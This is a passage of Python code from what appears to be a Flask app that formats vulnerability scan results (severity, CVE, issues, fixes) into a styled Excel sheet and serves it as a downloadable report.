        sev_color = colors.get(severity, "7F8C8D")
        cell_style(ws, row, 3, severity, bold=True, bg=sev_color, fg="FFFFFF")
        cell_style(ws, row, 4, r.get("cve", ""), bg=row_bg, fg="7FB3D3")
        cell_style(ws, row, 5, issues_str, bg=row_bg, fg="D0C4C4", wrap=True)
        cell_style(ws, row, 6, r.get("fix", ""), bg=row_bg, fg="A8D5A2", wrap=True)
        ws.row_dimensions[row].height = 55

    # Freeze panes
    ws.freeze_panes = f"A{header_row + 1}"

    output = io.BytesIO()
    wb.save(output)
    output.seek(0)
    return send_file(
        output,
        mimetype="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        as_attachment=True,
        download_name=f"vulnscan-report-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}.xlsx"
    )

if __name__ == "__main__":
    app.run(debug=True, port=5000)
